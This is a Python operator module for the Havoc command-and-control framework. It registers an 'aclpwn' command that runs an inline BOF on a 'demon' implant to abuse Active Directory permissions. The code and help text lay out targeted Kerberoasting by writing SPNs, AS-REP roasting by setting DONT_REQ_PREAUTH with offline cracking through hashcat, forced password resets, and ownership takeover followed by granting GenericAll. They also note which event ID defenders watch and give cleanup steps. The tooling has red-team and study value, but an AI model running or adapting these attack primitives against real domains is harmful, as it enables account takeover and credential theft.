from havoc import Demon, RegisterCommand, RegisterModule


_SUBCOMMANDS = {
    "list-spn-writers":     (0, "list principals that can write SPN on each no-SPN user"),
    "set-spn":              (1, "write servicePrincipalName on a target"),
    "clear-spn":            (2, "clear servicePrincipalName on a target"),
    "list-preauth-writers": (3, "list principals that can flip userAccountControl on preauth-required users"),
    "set-nopreauth":        (4, "set DONT_REQ_PREAUTH (0x400000) on a target"),
    "unset-nopreauth":      (5, "clear DONT_REQ_PREAUTH on a target"),
    "list-pwreset-writers":    (6, "list principals that can reset each enabled user's password"),
    "reset-password":          (7, "reset a target's password via unicodePwd LDAP modify"),
    "list-writeowner-writers": (8, "list principals that can take ownership of each enabled user"),
    "take-ownership":          (9, "flip nTSecurityDescriptor OWNER to --principal (defaults to self)"),
    "grant-genericall":        (10, "append GenericAll ACE for --principal (defaults to self) on the target"),
    "pwn-writeowner":          (11, "take-ownership then grant-genericall in one shot"),
    "restore-owner":           (12, "restore nTSecurityDescriptor OWNER back to --owner"),
}


def _parse_flags(param, flags):
    values = {name: spec[1] for name, spec in flags.items()}
    i = 0
    while i < len(param):
        p = param[i]
        matched = None
        for name in flags:
            if p == name or p.startswith(name + "="):
                matched = name
                break
        if matched is None:
            i += 1
            continue
        if p == matched:
            if i + 1 >= len(param):
                return values, f"flag {matched} requires a value"
            val = param[i + 1]
            i += 2
        else:
            val = p.split("=", 1)[1]
            i += 1
        values[matched] = val
    return values, None


def aclpwn_cmd(demonID, *param):
    demon  = Demon(demonID)
    packer = Packer()

    if not param:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: aclpwn <subcommand> [flags]\n"
            "Subcommands: " + ", ".join(_SUBCOMMANDS.keys()))
        return False

    sub = param[0]
    if sub not in _SUBCOMMANDS:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           f"unknown subcommand: {sub}\n"
                           f"valid: {', '.join(_SUBCOMMANDS.keys())}")
        return False
    mode, opname = _SUBCOMMANDS[sub]

    flags = {
        "--target":    (str, ""),
        "--spn":       (str, ""),
        "--password":  (str, ""),
        "--principal": (str, ""),
        "--owner":     (str, ""),
        "--domain":    (str, ""),
        "--user":      (str, ""),
        "--pass":      (str, ""),
    }
    values, err = _parse_flags(list(param[1:]), flags)
    if err:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, err)
        return False

    target    = values["--target"]
    spn       = values["--spn"]
    password  = values["--password"]
    principal = values["--principal"]
    owner     = values["--owner"]
    domain    = values["--domain"]
    user      = values["--user"]
    passw     = values["--pass"]
    rest = list(param[1:])
    force = 1 if "--force" in rest else 0
    noise = 1 if "--noise" in rest else 0

    _NEEDS_TARGET = (1, 2, 4, 5, 7, 9, 10, 11, 12)
    _LIST_MODES   = (0, 3, 6, 8)

    if mode in _NEEDS_TARGET and not target:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--target is required for this subcommand")
        return False
    if mode == 1 and not spn:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--spn is required for set-spn")
        return False
    if mode == 12 and not owner:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--owner <SID|sAM> is required for restore-owner")
        return False

    # The single value slot carries different flags depending on the mode:
    #   set-spn        -> --spn
    #   reset-password -> --password
    #   take-ownership / grant-genericall / pwn-writeowner -> --principal
    #   restore-owner  -> --owner
    if mode == 7:      slot = password
    elif mode == 12:   slot = owner
    elif mode in (9, 10, 11): slot = principal
    else:              slot = spn

    # trailing int carries `noise` for list-* modes, `force` for set-spn (else 0)
    trailing = noise if mode in _LIST_MODES else force

    packer.addint(mode)
    packer.addstr(target)
    packer.addstr(slot)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(passw)
    packer.addint(trailing)

    if mode in _LIST_MODES:
        label = "(domain-wide, --noise)" if noise else "(domain-wide)"
    else:
        label = target
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
                                f"Tasked demon to {opname} {label}")
    demon.InlineExecute(TaskID, "go", "bin/aclpwn.x64.o", packer.getbuffer(), False)
    return TaskID


ACLPWN_HELP = (
    "ACL / ACE abuse primitives for targeted attribute writes.\n"
    "Roasting itself is out of scope - use nanorobeus or a dedicated\n"
    "asreproast / kerberoast BOF once the attribute is set.\n"
    "\n"
    "TARGETED KERBEROAST (servicePrincipalName):\n"
    "  aclpwn list-spn-writers [--noise]\n"
    "      For each enabled user with EMPTY servicePrincipalName, print\n"
    "      every principal that holds a right allowing SPN write on that\n"
    "      target. Domain-wide - NOT gated on the current identity.\n"
    "\n"
    "  aclpwn set-spn --target <DN|sAM> --spn <value> [--force]\n"
    "      Replace servicePrincipalName. Refuses if already populated\n"
    "      unless --force.\n"
    "\n"
    "  aclpwn clear-spn --target <DN|sAM>\n"
    "      Delete servicePrincipalName (cleanup after roasting).\n"
    "\n"
    "TARGETED AS-REP ROAST (userAccountControl DONT_REQ_PREAUTH bit):\n"
    "  aclpwn list-preauth-writers [--noise]\n"
    "      For each enabled user whose DONT_REQ_PREAUTH is NOT already\n"
    "      set, print every principal that can flip userAccountControl\n"
    "      on that target.\n"
    "\n"
    "  aclpwn set-nopreauth --target <DN|sAM>\n"
    "      OR the DONT_REQ_PREAUTH bit (0x400000) into userAccountControl.\n"
    "      The AS-REP for the target then comes back encrypted with the\n"
    "      user's NTLM hash and can be roasted offline (hashcat 18200).\n"
    "\n"
    "  aclpwn unset-nopreauth --target <DN|sAM>\n"
    "      Clear DONT_REQ_PREAUTH (cleanup).\n"
    "\n"
    "PASSWORD RESET (User-Force-Change-Password extended right):\n"
    "  aclpwn list-pwreset-writers [--noise]\n"
    "      For each enabled user, print every principal that can reset\n"
    "      the user's password. Matches ControlAccess ACEs keyed to the\n"
    "      Force-Change-Password rightsGuid, plus GenericAll / WriteDACL\n"
    "      / WriteOwner / Owner. GenericWrite does NOT grant this right.\n"
    "\n"
    "  aclpwn reset-password --target <DN|sAM> [--password <pw>]\n"
    "      Replace unicodePwd on the target via LDAP modify (requires\n"
    "      the sign+seal bind we always use, or LDAPS). If --password is\n"
    "      omitted, a 16-char random password is generated and printed.\n"
    "      Blue teams alert on Event ID 4724.\n"
    "\n"
    "WRITEOWNER TAKEOVER (two-step: take ownership -> grant self GenericAll):\n"
    "  aclpwn list-writeowner-writers [--noise]\n"
    "      For each enabled user, print every principal that can take\n"
    "      ownership: GenericAll / WriteOwner / WriteDACL (indirect) /\n"
    "      Owner. GenericWrite does NOT grant this.\n"
    "\n"
    "  aclpwn take-ownership --target <DN|sAM> [--principal <SID|sAM>]\n"
    "      Write nTSecurityDescriptor OWNER to --principal (defaults to\n"
    "      the current process identity). Owner has implicit WriteDACL.\n"
    "\n"
    "  aclpwn grant-genericall --target <DN|sAM> [--principal <SID|sAM>]\n"
    "      Append an ACCESS_ALLOWED_ACE(GenericAll) to the target's DACL\n"
    "      for --principal (defaults to self). Requires WriteDACL (or the\n"
    "      implicit one that take-ownership gave us).\n"
    "\n"
    "  aclpwn pwn-writeowner --target <DN|sAM> [--principal <SID|sAM>]\n"
    "      take-ownership then grant-genericall in one shot.\n"
    "\n"
    "  aclpwn restore-owner --target <DN|sAM> --owner <SID|sAM>\n"
    "      Set nTSecurityDescriptor OWNER back to --owner. Cleanup helper;\n"
    "      capture the original owner from list-writeowner-writers output\n"
    "      BEFORE flipping. There is no way to auto-remember the old owner.\n"
    "\n"
    "GLOBAL FLAGS:\n"
    "  --noise                Include default principals (SYSTEM, Domain\n"
    "                         Admins, BUILTIN\\Administrators, Operators,\n"
    "                         Enterprise DCs, SELF, CREATOR OWNER,\n"
    "                         Everyone, built-in Administrator RID 500,\n"
    "                         Schema/Enterprise Admins, DCs, GPO CO) in\n"
    "                         list-* output.\n"
    "  --force                Overwrite a populated attribute (set-spn).\n"
    "  --domain <d>           NetBIOS or DNS domain; also selects DC.\n"
    "  --user <u>             LDAP bind username (alt-creds).\n"
    "  --pass <p>             LDAP bind password (alt-creds).\n"
    "\n"
    "EXAMPLES:\n"
    "  aclpwn list-spn-writers\n"
    "  aclpwn set-spn --target jnovoa --spn HTTP/bogus.corp.local\n"
    "  aclpwn clear-spn --target jnovoa\n"
    "  aclpwn list-preauth-writers\n"
    "  aclpwn set-nopreauth --target rcastillo\n"
    "  aclpwn unset-nopreauth --target rcastillo\n"
    "  aclpwn list-pwreset-writers\n"
    "  aclpwn reset-password --target anovoa\n"
    "  aclpwn reset-password --target anovoa --password 'MyN3wP@ss!'\n"
    "  aclpwn list-writeowner-writers\n"
    "  aclpwn take-ownership --target rcastillo\n"
    "  aclpwn grant-genericall --target rcastillo\n"
    "  aclpwn pwn-writeowner --target rcastillo\n"
    "  aclpwn pwn-writeowner --target rcastillo --principal S-1-5-21-...-1104\n"
    "  aclpwn restore-owner --target rcastillo --owner S-1-5-21-...-1000\n"
)


RegisterCommand(aclpwn_cmd, "", "aclpwn",
                "Targeted-kerberoast: inventory ACL edges on no-SPN users and set/clear servicePrincipalName.",
                0,
                ACLPWN_HELP,
                "list-spn-writers")
